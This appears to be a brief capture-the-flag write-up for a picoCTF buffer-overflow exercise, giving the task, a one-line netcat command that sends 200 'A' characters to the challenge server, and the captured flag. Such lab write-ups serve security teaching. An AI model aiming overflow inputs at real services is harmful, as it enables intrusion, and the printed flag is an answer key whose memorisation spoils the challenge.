# Objetivo

Smash the stack Let's start off simple, can you overflow the correct buffer? The program is available [here](https://artifacts.picoctf.net/c/173/vuln). You can view source [here](https://artifacts.picoctf.net/c/173/vuln.c). And connect with it using: `nc saturn.picoctf.net 51532`

# Solucion

```Shell

┌──(kali㉿kali)-[~]
└─$ nc saturn.picoctf.net 51532 <<< $(python3 -c "print('A'*200)")
Input: picoCTF{ov3rfl0ws_ar3nt_that_bad_90d2bb58}
```

# Notas adicionales

# Referencias